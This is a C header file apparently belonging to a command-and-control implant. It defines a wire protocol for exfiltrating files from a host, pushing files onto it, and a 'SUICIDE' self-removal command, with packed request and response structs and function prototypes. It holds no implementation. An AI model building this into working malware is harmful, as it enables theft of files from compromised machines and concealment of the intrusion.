#ifndef CNC_PROT_H
#define CNC_PROT_H

#include <stdint.h>

enum request_type
{
    EXF_FILE,
    INF_FILE,
    SUICIDE
};

enum exf_file_error
{
    GOOD,
    OPEN_ERROR,
    STAT_ERROR,
    READ_ERROR
};

struct __attribute__((__packed__)) cnc_request
{
    uint8_t type;
    uint32_t req_len;
    char data[];
};

struct __attribute__((__packed__)) cnc_response
{
    uint32_t res_len;
    char data[];
};

struct __attribute__((__packed__)) exf_format_req
{
    uint8_t path_len;
    char path[];
};

struct __attribute__((__packed__)) exf_format_res
{
    uint8_t err;
    uint32_t content_len;
    char content[];
};

struct __attribute__((__packed__)) inf_format_req_path
{
    uint8_t path_len;
    char path[];
};

struct __attribute__((__packed__)) inf_format_req_content
{
    uint32_t content_len;
    char content[];
};

struct __attribute__((__packed__)) inf_format_res
{
    uint8_t status;
};

struct exf_format_res *get_exf_from_cnc_res(struct cnc_response *res);
struct exf_format_req *get_exf_from_cnc_req(struct cnc_request *req);
struct inf_format_res *get_inf_from_cnc_res(struct cnc_response *res);
struct inf_format_req_path *get_inf_path_from_cnc_req(struct cnc_request *req);
struct inf_format_req_content *get_inf_content_from_cnc_req(struct cnc_request *req);
struct cnc_response *cnc_exf_res_init(uint32_t file_size, uint8_t err);
struct cnc_response *cnc_inf_res_init(uint8_t status);

#endif
